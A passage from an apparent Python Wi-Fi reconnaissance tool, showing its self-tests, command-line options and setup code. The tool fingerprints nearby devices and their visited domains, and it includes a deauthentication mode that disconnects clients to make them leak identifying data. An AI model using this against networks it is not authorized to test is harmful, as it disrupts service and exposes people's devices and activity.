    check("sec WPA2-PSK (akm 2)", classify_security(True, [2]) == "WPA2-PSK")
    check("sec WPA2-Ent (akm 1)", classify_security(True, [1]) == "WPA2-Ent")
    check("sec WPA1 vendor IE", classify_security(True, [], True) == "WPA")
    rsn = (b"\x01\x00" + b"\x00\x0f\xac\x04" + b"\x01\x00" +
           b"\x00\x0f\xac\x04" + b"\x01\x00" + b"\x00\x0f\xac\x02")
    check("RSN AKM parse -> PSK", _rsn_akms(rsn) == [2])
    ts = Tracker()
    ts.observe("aa:00:00:00:00:31", rssi=-40, channel=6, is_ap=True)
    ts.register_bssid("aa:00:00:00:00:31", "FreeWiFi")
    ts.set_security("aa:00:00:00:00:31", "OPEN")
    check("security_for_ssid", ts.security_for_ssid("FreeWiFi") == "OPEN")

    # channel width / frequency
    check("chan->freq 2.4", channel_to_freq(6) == 2437)
    check("chan->freq 5G ch149", channel_to_freq(149) == 5745)
    check("chan->freq ch36", channel_to_freq(36) == 5180)
    check("width 80 uses set freq",
          width_iw_args("wlan0", 149, 80, 155) ==
          ["iw", "dev", "wlan0", "set", "freq", "5745", "80", "5775"])
    check("width 40 uses HT40+",
          width_iw_args("wlan0", 36, 40, None, "+")[-1] == "HT40+")
    check("width 20 falls back to set channel",
          width_iw_args("wlan0", 6) ==
          ["iw", "dev", "wlan0", "set", "channel", "6"])
    check("unknown channel -> None", width_iw_args("wlan0", 999) is None)

    trw = Tracker()
    trw.observe("aa:00:00:00:00:21", rssi=-40, channel=149, is_ap=True)
    trw.set_radio("aa:00:00:00:00:21", 80, 155, None)
    check("radio width stored", trw.radio_for("aa:00:00:00:00:21") == (80, 155, None))

    # nearest-AP lock + association counting
    tl = Tracker(rank_by="median", window_s=None, min_samples=1)
    tl.register_bssid("aa:00:00:00:00:11", "Campus")
    tl.register_bssid("aa:00:00:00:00:12", "Campus")
    for v in (-70, -71, -70):
        tl.observe("aa:00:00:00:00:11", rssi=v, channel=1, is_ap=True)
    for v in (-42, -41, -43):
        tl.observe("aa:00:00:00:00:12", rssi=v, channel=36, is_ap=True)
    best = tl.strongest_ap_for_ssid("Campus")
    check("strongest AP picked", best is not None and best[0] == "aa:00:00:00:00:12")
    check("lock channel = nearest AP's", best[1] == 36)
    for _ in range(30):
        tl.note_data("aa:00:00:00:00:11")
    b2 = tl.best_ap_for_ssid("Campus")
    check("busiest AP beats strongest when it has the clients",
          b2[0] == "aa:00:00:00:00:11" and b2[1] == 1 and b2[3] == 30)
    tl2 = Tracker()
    tl2.register_bssid("aa:00:00:00:00:41", "Q")
    tl2.register_bssid("aa:00:00:00:00:42", "Q")
    tl2.observe("aa:00:00:00:00:41", rssi=-70, channel=1, is_ap=True)
    tl2.observe("aa:00:00:00:00:42", rssi=-40, channel=6, is_ap=True)
    check("no-data fallback = strongest",
          tl2.best_ap_for_ssid("Q")[0] == "aa:00:00:00:00:42")
    tl.observe("de:00:00:00:00:91", rssi=-55, channel=36, bssid="aa:00:00:00:00:12")
    check("associated count", tl.count_associated("Campus") == 1)
    tl.observe("de:00:00:00:00:92", rssi=-50, channel=36)
    check("unassociated not counted", tl.count_associated("Campus") == 1)

    # SSID focus
    tf = Tracker()
    tf.register_bssid("aa:00:00:00:00:01", "HomeNet")
    tf.register_bssid("aa:00:00:00:00:02", "HomeNet")
    tf.register_bssid("ac:00:00:00:00:03", "OtherNet")
    tf.observe("aa:00:00:00:00:01", rssi=-40, channel=6, is_ap=True)
    tf.observe("aa:00:00:00:00:02", rssi=-45, channel=36, is_ap=True)
    tf.observe("ac:00:00:00:00:03", rssi=-50, channel=11, is_ap=True)
    tf.observe("de:00:00:00:00:aa", rssi=-55, channel=6, bssid="aa:00:00:00:00:01")
    tf.observe("de:00:00:00:00:bb", rssi=-60, channel=36, bssid="aa:00:00:00:00:02")
    tf.observe("de:00:00:00:00:cc", rssi=-52, channel=11, bssid="ac:00:00:00:00:03")
    tf.observe("de:00:00:00:00:dd", rssi=-58, channel=6, ssid="HomeNet")
    targets = tf.bssids_for_ssid("HomeNet")
    check("ssid->bssids (mesh set)",
          targets == {"aa:00:00:00:00:01", "aa:00:00:00:00:02"})
    check("ssid->channels (sweep narrowing)",
          tf.channels_for_ssid("HomeNet") == {6, 36})
    macs = {s.mac for s in tf.snapshot() if s.bssid in targets}
    check("ssid filter keeps both mesh clients",
          {"de:00:00:00:00:aa", "de:00:00:00:00:bb"} <= macs)
    check("ssid filter drops other network", "de:00:00:00:00:cc" not in macs)
    check("ssid filter drops probe-only (not connected)",
          "de:00:00:00:00:dd" not in macs)

    # enrichment parsers
    inst, svc = _mdns_friendly("Akshats-iPhone._companion-link._tcp.local")
    check("mdns friendly name", inst == "Akshats-iPhone" and svc == "companion-link")
    check("dhcp vendor->OS (android)", _dhcp_vendor_os("android-dhcp-13") == "Android")
    check("dhcp vendor->OS (msft)", _dhcp_vendor_os("MSFT 5.0") == "Windows")
    check("txt model=", _txt_model([b"md=Chromecast", b"ic=/setup"]) == "Chromecast")
    check("http header UA",
          _http_header(b"GET / HTTP/1.1\r\nHost: x\r\nUser-Agent: Dalvik/2.1\r\n\r\n",
                       b"User-Agent") == "Dalvik/2.1")

    def nb_encode(name):
        name = name.ljust(16)[:16]
        enc = bytearray()
        for ch in name.encode("ascii"):
            enc.append(0x41 + (ch >> 4))
            enc.append(0x41 + (ch & 0x0F))
        return bytes(12) + bytes([0x20]) + bytes(enc) + b"\x00"
    check("netbios decode", (_parse_netbios(nb_encode("LAPTOP")) or "").startswith("LAPTOP"))

    # WPS TLV parse
    def wps(t, v):
        return bytes([t >> 8, t & 0xFF, 0, len(v)]) + v
    blob = (wps(0x1011, b"Akshat-PC") + wps(0x1021, b"Dell")
            + wps(0x1023, b"XPS13"))
    tw = Tracker()
    tw.observe("de:11:11:11:11:11", rssi=-40)
    _parse_wps_tlvs(blob, tw, "de:11:11:11:11:11")
    ws = tw.stations["de:11:11:11:11:11"]
    check("wps device name", ws.hostname == "Akshat-PC")
    check("wps model", "Dell" in (ws.model or "") and "XPS13" in (ws.model or ""))

    tm = Tracker()
    tm.observe("de:22:22:22:22:22", rssi=-55)
    tm.set_info(mac="de:22:22:22:22:22", service="airplay")
    tm.set_info(mac="de:22:22:22:22:22", service="chromecast", model="AppleTV6,2")
    ms = tm.stations["de:22:22:22:22:22"]
    check("services accumulate", ms.services == {"airplay", "chromecast"})
    check("best_device prefers model", ms.best_device() == "AppleTV6,2")
    tm.set_info(mac="de:22:22:22:22:22", domain="spotify.com")
    check("domains captured", "spotify.com" in ms.domains)

    # robust ranking
    check("percentile median", _percentile([1, 2, 3, 4, 5], 50) == 3)
    check("percentile p80", abs(_percentile([-90, -80, -70, -60, -50], 80)
                                 - (-58.0)) < 0.001)
    rk = Tracker(rank_by="median", window_s=None, min_samples=5)
    for v in (-62, -60, -61, -59, -60, -60, -61):
        rk.observe("de:aa:aa:aa:aa:a1", rssi=v)
    rk.observe("de:bb:bb:bb:bb:b2", rssi=-30)
    ordered = rk.snapshot()
    check("robust rank beats lucky spike",
          ordered[0].mac == "de:aa:aa:aa:aa:a1")
    stA = rk.stations["de:aa:aa:aa:aa:a1"]
    check("median rank_value", -62 <= stA.rank_value("median", None) <= -59)
    check("confident has enough samples", stA.sample_count() >= 5)
    check("spike marked low-confidence",
          rk.stations["de:bb:bb:bb:bb:b2"].sample_count() < 5)
    check("max stat picks strongest", stA.rank_value("max", None) == -59)

    # signal-first ranking
    rs = Tracker(rank_by="weighted", half_life=6.0)
    for _ in range(50):
        rs.observe("de:00:00:00:00:f0", rssi=-70)
    rs.observe("de:00:00:00:00:f1", rssi=-20)
    rs.observe("de:00:00:00:00:f1", rssi=-21)
    order = rs.snapshot()
    check("strong few-sample device ranks above weak many-sample",
          order[0].mac == "de:00:00:00:00:f1")
    rs.observe("de:00:00:00:00:f2", rssi=-5)
    order = rs.snapshot()
    check("single-sample fluke stays last", order[-1].mac == "de:00:00:00:00:f2")

    react = Station("de:00:00:00:00:f3", lock=threading.RLock())
    now = time.time()
    with react.lock:
        for k in range(20):
            react.samples.append((now - 20 + k * 0.2, -75))
        for k in range(6):
            react.samples.append((now - 1 + k * 0.1, -35))
    w = react.weighted_rssi(3.0)
    med = react.rank_value("median", None)
    check("weighted reacts toward recent", w > med and w > -60)

    # concurrency test
    class _A:
        window = 5
        rank_by = "median"
        min_samples = 3
        estimate_distance = False
        ssid = None
    tcc = Tracker(window_s=5)
    stop = threading.Event()
    errbox = []

    def _writer():
        i = 0
        while not stop.is_set():
            tcc.observe("de:cc:cc:cc:cc:0%d" % (i % 6), rssi=-40 - (i % 30),
                        channel=(i % 11) + 1, bssid="aa:bb:cc:dd:ee:0%d" % (i % 3))
            i += 1

    def _reader():
        try:
            for _ in range(4000):
                for stt in tcc.snapshot():
                    _row_fields(stt, oui, _A, 1)
                    stt.recent_list(); stt.channels_list()
        except Exception as e:
            errbox.append(repr(e))
    threads = [threading.Thread(target=_writer) for _ in range(3)]
    threads.append(threading.Thread(target=_reader))
    for t in threads:
        t.start()
    threads[-1].join(timeout=15)
    stop.set()
    for t in threads[:-1]:
        t.join(timeout=2)
    check("concurrent read/write: no crash", not errbox)
    if errbox:
        print("     race error:", errbox[0])

    # fingerprint DB + IPv6/TTL/EUI-64 + Kalman
    check("dhcp fp -> Windows",
          dhcp_fp_os("1,15,3,6,44,46,47,31,33,121,249,43") == "Windows")
    check("dhcp fp -> iOS", dhcp_fp_os("1,121,3,6,15,119,252") == "iOS/iPadOS")
    check("dhcp fp family (win variant)",
          dhcp_fp_os("1,15,3,6,44,46,47,31,33,121,249,9,9,9") == "Windows")
    check("dhcp fp unknown -> None", dhcp_fp_os("99,98,97") is None)
    check("ttl 64 -> unix-ish", ttl_os(64) == "Linux/Apple/Android")
    check("ttl 120 -> windows", ttl_os(120) == "Windows")
    check("ttl 250 -> net gear", ttl_os(250) == "network device")
    check("eui64 decode",
          eui64_to_mac("fe80::0223:45ff:fe67:89ab") == "00:23:45:67:89:ab")
    check("eui64 non-eui returns None",
          eui64_to_mac("2001:db8::1") is None)
    st_k = None
    for _ in range(20):
        st_k = kalman_step(st_k, -70)
    check("kalman converges", abs(st_k[0] - (-70)) < 2)
    for _ in range(20):
        st_k = kalman_step(st_k, -40)
    check("kalman tracks a move", st_k[0] > -55)
    tki = Tracker()
    tki.observe("de:ad:00:00:00:aa", rssi=-60, iface="wlan0")
    tki.observe("de:ad:00:00:00:aa", rssi=-35, iface="wlan1")
    check("loudest iface = stronger adapter",
          tki.stations["de:ad:00:00:00:aa"].loudest_iface() == "wlan1")
    trk = Tracker(rank_by="kalman")
    for _ in range(10):
        trk.observe("de:ad:00:00:00:bb", rssi=-50)
    check("kalman rank estimate present",
          trk.stations["de:ad:00:00:00:bb"].estimate("kalman", None, 6) is not None)

    # RTS liveness probe helpers
    laa = random_laa_mac()
    check("laa mac is valid + unicast + locally-administered",
          normalize_mac(laa) == laa and not mac_is_multicast(laa)
          and mac_is_locally_administered(laa))
    rf = rts_fields("aa:bb:cc:dd:ee:ff", laa)
    check("rts fields: control/RTS type+subtype",
          rf and rf["type"] == 1 and rf["subtype"] == 11)
    check("rts fields: addr1=target addr2=src",
          rf["addr1"] == "aa:bb:cc:dd:ee:ff" and rf["addr2"] == laa)
    check("rts refuses multicast target",
          rts_fields("01:00:5e:00:00:01", laa) is None)

    # --- deauth helpers ---------------------------------------------------
    df = deauth_fields("aa:bb:cc:dd:ee:ff", "11:22:33:44:55:66")
    check("deauth fields: mgmt/deauth type+subtype",
          df and df["type"] == 0 and df["subtype"] == 12)
    check("deauth fields: addr1=target addr2=bssid",
          df["addr1"] == "aa:bb:cc:dd:ee:ff" and df["addr2"] == "11:22:33:44:55:66")
    check("deauth fields: addr3=bssid", df["addr3"] == "11:22:33:44:55:66")
    check("deauth fields: reason code 7", df["reason"] == 7)
    check("deauth refuses multicast target",
          deauth_fields("01:00:5e:00:00:01", "11:22:33:44:55:66") is None)
    check("deauth refuses missing bssid",
          deauth_fields("aa:bb:cc:dd:ee:ff", None) is None)
    # tracker.deauths counter exists
    td = Tracker()
    check("tracker has deauths counter", td.deauths == 0)
    check("tracker has deauth_log", isinstance(td.deauth_log, dict) and len(td.deauth_log) == 0)

    # --- deauth tracking methods ------------------------------------------
    td2 = Tracker()
    td2.observe("aa:bb:cc:dd:ee:01", rssi=-50, bssid="11:22:33:44:55:66")
    # needs_enrichment: no hostname/ip/os_hint => True
    check("needs_enrichment: missing all => True",
          td2.needs_enrichment("aa:bb:cc:dd:ee:01") is True)
    # set hostname -> needs_enrichment should be False
    td2.set_info(mac="aa:bb:cc:dd:ee:01", hostname="myphone")
    check("needs_enrichment: has hostname => False",
          td2.needs_enrichment("aa:bb:cc:dd:ee:01") is False)
    # needs_enrichment for unknown MAC => False
    check("needs_enrichment: unknown MAC => False",
          td2.needs_enrichment("ff:ff:ff:ff:ff:00") is False)

    # deauth_due: never deauthed => True
    check("deauth_due: never deauthed => True",
          td2.deauth_due("aa:bb:cc:dd:ee:01", 120) is True)
    # log_deauth then check cooldown
    td2.log_deauth("aa:bb:cc:dd:ee:01")
    check("deauth_due: just deauthed, short cooldown => False",
          td2.deauth_due("aa:bb:cc:dd:ee:01", 120) is False)
    check("deauth_due: just deauthed, zero cooldown => True",
          td2.deauth_due("aa:bb:cc:dd:ee:01", 0) is True)
    # log_deauth records in deauth_log
    check("log_deauth records timestamp",
          "aa:bb:cc:dd:ee:01" in td2.deauth_log)

    # needs_enrichment with only ip set
    td3 = Tracker()
    td3.observe("aa:bb:cc:dd:ee:02", rssi=-60, bssid="11:22:33:44:55:66")
    td3.set_info(mac="aa:bb:cc:dd:ee:02", ip="192.168.1.5")
    check("needs_enrichment: has ip => False",
          td3.needs_enrichment("aa:bb:cc:dd:ee:02") is False)
    # needs_enrichment with only os_hint set
    td3.observe("aa:bb:cc:dd:ee:03", rssi=-60, bssid="11:22:33:44:55:66")
    td3.set_info(mac="aa:bb:cc:dd:ee:03", os_hint="Android")
    check("needs_enrichment: has os_hint => False",
          td3.needs_enrichment("aa:bb:cc:dd:ee:03") is False)

    # device-kind classification
    check("kind android->phone", classify_kind(os_hint="Android") == "phone")
    check("kind windows->computer", classify_kind(os_hint="Windows") == "computer")
    check("kind linux->computer", classify_kind(os_hint="Linux") == "computer")
    check("kind raspberry->iot",
          classify_kind(os_hint="Linux", hostname="raspberrypi") == "iot")
    check("kind hostname motorola->phone",
          classify_kind(hostname="motorola-edge-50") == "phone")
    check("kind hostname thinkpad->computer",
          classify_kind(hostname="akshat-thinkpad") == "computer")
    check("kind chromecast->iot",
          classify_kind(services=["chromecast"]) == "iot")
    check("kind intel vendor->computer",
          classify_kind(vendor="Intel Corporate") == "computer")
    check("kind xiaomi vendor->phone",
          classify_kind(vendor="Xiaomi Communications") == "phone")
    check("kind unknown->?", classify_kind() == "?")

    class _KA:
        only = "computer"; include_unknown = False
    tk = Tracker()
    tk.observe("de:c0:00:00:00:01", rssi=-40)
    tk.set_info(mac="de:c0:00:00:00:01", os_hint="Windows", hostname="win-pc")
    tk.observe("de:c0:00:00:00:02", rssi=-30)
    tk.set_info(mac="de:c0:00:00:00:02", os_hint="Android", hostname="pixel")
    tk.observe("de:c0:00:00:00:03", rssi=-20)
    kept = apply_kind_filter(tk.snapshot(), _KA)
    macs = {s.mac for s in kept}
    check("--only computer keeps the PC", "de:c0:00:00:00:01" in macs)
    check("--only computer drops the phone", "de:c0:00:00:00:02" not in macs)
    check("--only computer drops unknown by default", "de:c0:00:00:00:03" not in macs)
    _KA.include_unknown = True
    macs2 = {s.mac for s in apply_kind_filter(tk.snapshot(), _KA)}
    check("--include-unknown shows unknown", "de:c0:00:00:00:03" in macs2)

    # SQLite persistence
    class _DBA:
        rank_by = "weighted"; window = 30; half_life = 6.0
        show_aps = False; max_age = None; only_bssids = None; top = 30
    dbpath = os.path.join(tempfile.gettempdir(), "_wifi_db_test.db")
    try:
        os.remove(dbpath)
    except OSError:
        pass
    tdb = Tracker()
    tdb.register_bssid("aa:00:00:00:00:51", "CafeWiFi")
    tdb.observe("de:db:00:00:00:01", rssi=-40, channel=6,
                bssid="aa:00:00:00:00:51")
    tdb.set_info(mac="de:db:00:00:00:01", ip="192.168.1.50",
                 hostname="my-phone", os_hint="Android")
    ouix = OuiResolver()
    db = DeviceDB(dbpath)
    n1 = db.flush(tdb, ouix, _DBA)
    check("db flush wrote a row", n1 >= 1)
    cur = db.conn.execute("SELECT hostname, ip, os_hint, network FROM devices "
                          "WHERE mac='de:db:00:00:00:01'")
    row = cur.fetchone()
    check("db stored hostname/ip", row and row[0] == "my-phone"
          and row[1] == "192.168.1.50")
    check("db stored os + network", row and row[2] == "Android"
          and row[3] == "CafeWiFi")
    tdb.stations["de:db:00:00:00:01"].hostname = None
    db.flush(tdb, ouix, _DBA)
    row2 = db.conn.execute("SELECT hostname FROM devices WHERE "
                           "mac='de:db:00:00:00:01'").fetchone()
    check("db upsert keeps prior hostname (sticky)", row2[0] == "my-phone")
    cnt = db.conn.execute("SELECT COUNT(*) FROM devices").fetchone()[0]
    check("db one row per MAC", cnt == 1)
    db.close()
    try:
        os.remove(dbpath)
    except OSError:
        pass

    # --- 5 GHz band plan --------------------------------------------------
    check("band 5 is 5 GHz only", all(c >= 36 for c in band_channels("5")))
    check("band 5 excludes DFS by default", 52 not in band_channels("5"))
    check("band 5 --include-dfs adds DFS",
          52 in band_channels("5", include_dfs=True))
    check("band 2.4 is 2.4 GHz only", set(band_channels("2.4")) == set(CHANNELS_24))
    check("band all is 5 GHz-first",
          band_channels("all")[0] == 36 and 1 in band_channels("all"))
    check("band 5 has the common non-DFS channels",
          set([36, 40, 44, 48, 149, 153, 157, 161, 165])
          <= set(band_channels("5")))

    # --- VHT center-channel derivation (fixed-channel width) --------------
    check("center 80 MHz ch149 -> 155", center_channel(149, 80) == 155)
    check("center 80 MHz ch36 -> 42", center_channel(36, 80) == 42)
    check("center 160 MHz ch36 -> 50", center_channel(36, 160) == 50)
    check("center 160 MHz ch149 -> 163", center_channel(149, 160) == 163)
    check("center 20 MHz -> None", center_channel(36, 20) is None)
    check("center unknown channel -> None", center_channel(999, 80) is None)
    check("fixed-channel VHT80 builds a set-freq cmd",
          width_iw_args("wlan0", 149, 80, center_channel(149, 80)) ==
          ["iw", "dev", "wlan0", "set", "freq", "5745", "80", "5775"])
    check("ht40 offset ch36 '+'", ht40_offset(36) == "+")
    check("ht40 offset ch40 '-'", ht40_offset(40) == "-")
    check("ht40 offset ch149 '+'", ht40_offset(149) == "+")

    # --- active L3 enrichment helpers (joined-interface resolve) ----------
    ipa, pfx = parse_ip_addr_show(
        "3: wlan1    inet 192.168.1.50/24 brd 192.168.1.255 scope global wlan1")
    check("ip addr show parse", ipa == "192.168.1.50" and pfx == 24)
    check("ip addr show no-inet -> (None,None)",
          parse_ip_addr_show("6: lo    inet6 ::1/128 scope host") == (None, None))
    check("subnet /24 CIDR", subnet_cidr("192.168.1.50", 24)[0] == "192.168.1.0/24")
    check("subnet /24 host count", subnet_cidr("192.168.1.50", 24)[1] == 254)
    check("subnet refuses huge /16", subnet_cidr("10.0.0.5", 16) == (None, 0))
    check("subnet refuses empty", subnet_cidr(None, None) == (None, 0))
    nmb = ("Looking up status of 192.168.1.20\n"
           "\tDESKTOP-ABC     <00> -         B <ACTIVE>\n"
           "\tWORKGROUP       <00> - <GROUP> B <ACTIVE>\n")
    check("nmblookup unique name", parse_nmblookup(nmb) == "DESKTOP-ABC")
    check("nmblookup skips group-only", parse_nmblookup(
        "\tWORKGROUP       <00> - <GROUP> B <ACTIVE>\n") is None)
    check("nmblookup no names -> None", parse_nmblookup("No reply") is None)
    check("default route iface",
          default_route_iface(
              "default via 192.168.1.1 dev wlan1 proto dhcp metric 600") == "wlan1")
    check("default route none",
          default_route_iface("192.168.1.0/24 dev wlan1 scope link") is None)

    # --- proper TLS SNI parse (replaces the weak regex) -------------------
    def _mk_clienthello(host):
        host_b = host.encode()
        entry = b"\x00" + len(host_b).to_bytes(2, "big") + host_b
        sni_list = len(entry).to_bytes(2, "big") + entry
        sni_ext = b"\x00\x00" + len(sni_list).to_bytes(2, "big") + sni_list
        body = (b"\x03\x03" + b"\x00" * 32 + b"\x00" +
                b"\x00\x02\x13\x01" + b"\x01\x00" +
                len(sni_ext).to_bytes(2, "big") + sni_ext)
        hs = b"\x01" + len(body).to_bytes(3, "big") + body
        return b"\x16\x03\x01" + len(hs).to_bytes(2, "big") + hs
    ch_hello = _mk_clienthello("example.com")
    check("tls sni proper parse", parse_tls_sni(ch_hello) == "example.com")
    check("tls sni via _tls_sni", _tls_sni(ch_hello) == "example.com")
    check("tls sni truncated -> None", parse_tls_sni(ch_hello[:30]) is None)
    check("tls sni non-tls -> None",
          parse_tls_sni(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n") is None)

    # --- security_unknown (lock-safe capture-thread guard) ----------------
    tsu = Tracker()
    tsu.observe("aa:00:00:00:00:71", rssi=-40, is_ap=True)
    check("security_unknown true before classify",
          tsu.security_unknown("aa:00:00:00:00:71") is True)
    tsu.set_security("aa:00:00:00:00:71", "OPEN")
    check("security_unknown false after classify",
          tsu.security_unknown("aa:00:00:00:00:71") is False)
    check("security_unknown false for unseen mac",
          tsu.security_unknown("aa:00:00:00:00:99") is False)

    print(f"\n{ok} passed, {fail} failed")
    return 0 if fail == 0 else 1


# ===========================================================================
# CLI
# ===========================================================================

DEFAULT_HOP_CHANNELS = [1, 6, 11, 2, 7, 3, 8, 4, 9, 5, 10,
                        36, 40, 44, 48, 149, 153, 157, 161]


def build_argparser():
    p = argparse.ArgumentParser(
        description="Passive Wi-Fi station proximity + recon (monitor mode).",
        epilog="Passive by default. Use only on networks/devices you are "
               "authorized to monitor.")
    p.add_argument("ifaces", nargs="*", metavar="iface",
                   help="one or more monitor-mode interfaces")
    p.add_argument("--alpha", type=float, default=0.3,
                   help="EMA smoothing factor for RSSI (default 0.3)")
    p.add_argument("--refresh", type=float, default=1.0,
                   help="UI refresh interval seconds (default 1.0)")
    p.add_argument("--top", type=int, default=None,
                   help="show at most N stations (default 10 with --ssid, else 30)")
    p.add_argument("--max-age", type=float, default=180, dest="max_age",
                   help="hide stations not seen for N seconds (default 180)")

    acc = p.add_argument_group("accuracy / ranking")
    acc.add_argument("--rank-by", dest="rank_by", default="weighted",
                     choices=["weighted", "kalman", "median", "ema", "mean",
                              "p80", "max"])
    acc.add_argument("--half-life", type=float, default=6.0, dest="half_life")
    acc.add_argument("--window", type=float, default=30)
    acc.add_argument("--min-samples", type=int, default=4, dest="min_samples")
    acc.add_argument("--accurate", action="store_true")

    ch = p.add_argument_group("channel")
    ch.add_argument("--channel", type=int)
    ch.add_argument("--band", choices=["2.4", "5", "all"], default="all",
                    help="band(s) to hop: '5' = 5 GHz only (use this for a "
                         "5 GHz network), '2.4' = 2.4 GHz only, 'all' = 5 GHz "
                         "first then 2.4 (default). '5'/'2.4' imply --hop.")
    ch.add_argument("--include-dfs", action="store_true", dest="include_dfs",
                    help="also hop 5 GHz DFS channels (52-144). Off by default: "
                         "many adapters won't tune them without radar detection.")
    ch.add_argument("--hop", action="store_true")
    ch.add_argument("--dwell", type=float, default=0.20)
    ch.add_argument("--hop-channels", type=str)
    ch.add_argument("--lock-strongest", action="store_true", dest="lock_strongest")
    ch.add_argument("--lock-after", type=float, default=20.0, dest="lock_after")
    ch.add_argument("--remon", action="store_true")
    ch.add_argument("--width", type=int, choices=[20, 40, 80, 160])

    fil = p.add_argument_group("filter")
    fil.add_argument("--ssid")
    fil.add_argument("--bssid")
    fil.add_argument("--show-aps", action="store_true", dest="show_aps")
    fil.add_argument("--only", dest="only")
    fil.add_argument("--include-unknown", action="store_true", dest="include_unknown")

    en = p.add_argument_group("enrichment")
    en.add_argument("--no-passive", action="store_false", dest="enrich_passive")
    en.add_argument("--enrich-local", action="store_true", dest="enrich_local",
                    help="actively resolve hostname+IP over a JOINED interface "
                         "(ARP sweep + mDNS + NetBIOS + reverse DNS). The "
                         "fast/reliable L3 path for open / your-own networks.")
    en.add_argument("--enrich-iface", dest="enrich_iface",
                    help="managed interface joined to the target network (has "
                         "an IP on the subnet) used for active resolution. "
                         "Auto-detected from the default route if omitted. "
                         "Implies --enrich-local.")
    en.add_argument("--enrich-interval", type=float, default=6.0,
                    dest="enrich_interval",
                    help="seconds between active enrichment passes (default 6)")
    en.add_argument("--no-arp-scan", action="store_false", dest="arp_scan",
                    help="disable the active ARP sweep in --enrich-local (the "
                         "sweep is on by default; it fills MAC<->IP fast).")
    en.add_argument("--oui-file", dest="oui_file")
    p.set_defaults(enrich_passive=True, arp_scan=True)

    dist = p.add_argument_group("distance estimate (rough!)")
    dist.add_argument("--estimate-distance", action="store_true",
                      dest="estimate_distance")
    dist.add_argument("--tx-power", type=float, default=-40, dest="tx_power")
    dist.add_argument("--path-loss", type=float, default=2.5, dest="path_loss")

    out = p.add_argument_group("output")
    out.add_argument("--output")
    out.add_argument("--db")
    out.add_argument("--db-interval", type=float, default=10.0, dest="db_interval")
    out.add_argument("--db-history", action="store_true", dest="db_history")
    out.add_argument("--no-rich", action="store_true", dest="no_rich")

    act = p.add_argument_group("active probing (AUTHORIZED LABS ONLY)")
    act.add_argument("--ping-clients", action="store_true", dest="ping_clients",
                     help="ACTIVE: inject rate-limited RTS frames to tracked "
                          "clients so they answer with a CTS â€” forces idle "
                          "devices to show up / refresh their RSSI. Does NOT "
                          "disconnect anything. Needs injection-capable adapter.")
    act.add_argument("--ping-interval", type=float, default=5.0, dest="ping_interval")
    act.add_argument("--ping-gap", type=float, default=0.05, dest="ping_gap")
    act.add_argument("--ping-max", type=int, default=40, dest="ping_max")
    act.add_argument("--ping-src", dest="ping_src")
    act.add_argument("--deauth", action="store_true",
                     help="ACTIVE: send deauthentication frames to tracked "
                          "clients, forcing them to reassociate with their AP. "
                          "During reassociation, clients leak DHCP (hostname/"
                          "IP/OS), ARP, mDNS, and probe requests â€” revealing "
                          "device info that is otherwise encrypted on WPA "
                          "networks. WARNING: This DISCONNECTS clients "
                          "temporarily. Requires injection-capable adapter. "
                          "Use ONLY on networks/devices you are authorized to "
                          "test.")
    act.add_argument("--deauth-interval", type=float, default=30.0,
                     dest="deauth_interval",
                     help="seconds between deauth sweeps (default 30; higher "
                          "= less disruptive)")
    act.add_argument("--deauth-count", type=int, default=3,
                     dest="deauth_count",
                     help="deauth frames per direction per client per sweep "
                          "(default 3)")
    act.add_argument("--deauth-gap", type=float, default=0.1,
                     dest="deauth_gap",
                     help="delay between deauthing different clients "
                          "(default 0.1s)")
    act.add_argument("--deauth-max", type=int, default=20,
                     dest="deauth_max",
                     help="max clients to deauth per sweep (default 20)")
    act.add_argument("--deauth-cooldown", type=float, default=120.0,
                     dest="deauth_cooldown",
                     help="per-client cooldown in seconds â€” skip a client if "
                          "it was deauthed within this window (default 120)")
    act.add_argument("--deauth-smart", action="store_true",
                     dest="deauth_smart",
                     help="smart targeting: only deauth clients that are "
                          "still missing hostname, IP, AND os_hint â€” stops "
                          "deauthing once enrichment succeeds")

    setup = p.add_argument_group("setup")
    setup.add_argument("--no-setup", action="store_true", dest="no_setup")
    setup.add_argument("--kill", action="store_true")
    setup.add_argument("--restore", action="store_true")
    setup.add_argument("--install-deps", action="store_true", dest="install_deps")

    p.add_argument("--selftest", action="store_true")
    return p


def main(argv=None):
    args = build_argparser().parse_args(argv)

    if args.selftest:
        return selftest()

    if not args.ifaces:
        print("error: an interface is required (e.g. wlan0). "
              "Try --help or --selftest.", file=sys.stderr)
        return 2
    args.iface = args.ifaces[0]
    args.iface_disp = "+".join(args.ifaces)

    is_root = (os.geteuid() == 0)

    if args.restore:
        if not is_root:
            print("error: --restore needs root (use sudo).", file=sys.stderr)
            return 1
        for ifc in args.ifaces:
            restore_managed(ifc)
            print(f"{ifc} set back to managed mode.")
        print("You may need: sudo systemctl restart NetworkManager")
        return 0

    if args.install_deps:
        ok = pip_install(["scapy", "rich"])
        print("dependencies installed." if ok else
              "warning: dependency install failed â€” see messages above.")

    if not is_root:
        print("error: capturing needs root. Re-run with sudo, e.g.:\n"
              f"    sudo python3 {os.path.basename(sys.argv[0])} {args.iface}",
              file=sys.stderr)
        return 1

    try:
        import scapy  # noqa: F401
    except Exception:
        print("\nFATAL: scapy is not installed â€” it is required for capture.\n"
              "  Fix it in one shot by re-running with --install-deps:\n"
              f"      sudo python3 {os.path.basename(sys.argv[0])} "
              f"{args.iface} --install-deps\n"
              "  Or manually:  sudo pip3 install scapy   (nicer UI: rich)\n",
              file=sys.stderr)
        return 1

    if not args.no_setup:
        for ifc in args.ifaces:
            state = iface_is_monitor(ifc)
            if state is None:
                print(f"[*] note: couldn't verify monitor mode on {ifc} "
                      "(is 'iw' installed?). Continuing anyway.")
                continue
            verb = ("enabling monitor mode" if state is False
                    else "applying broad capture flags")
            print(f"[*] {verb} on {ifc}"
                  + (" (killing interfering processes)â€¦" if args.kill else "â€¦"))
            ok, msg = enable_monitor(ifc, do_kill=args.kill)
            if not ok:
                print(f"FATAL: could not set monitor mode on {ifc}: {msg}\n"
                      "  Try adding --kill, or set it up manually:\n"
                      f"    sudo ip link set {ifc} down && "
                      f"sudo iw dev {ifc} set monitor otherbss control && "
                      f"sudo ip link set {ifc} up", file=sys.stderr)
                return 1
            print(f"[*] {ifc}: {msg}.")

    args.only_bssids = None
    if args.bssid:
        args.only_bssids = {normalize_mac(b) for b in args.bssid.split(",")}
        args.only_bssids.discard(None)
    if args.max_age == 0:
        args.max_age = None
    if args.accurate:
        if args.dwell <= 0.20:
            args.dwell = 0.5
        args.half_life = max(args.half_life, 8.0)
        if args.max_age and args.max_age < 180:
            args.max_age = 180
    if args.window == 0:
        args.window = None
    if args.only:
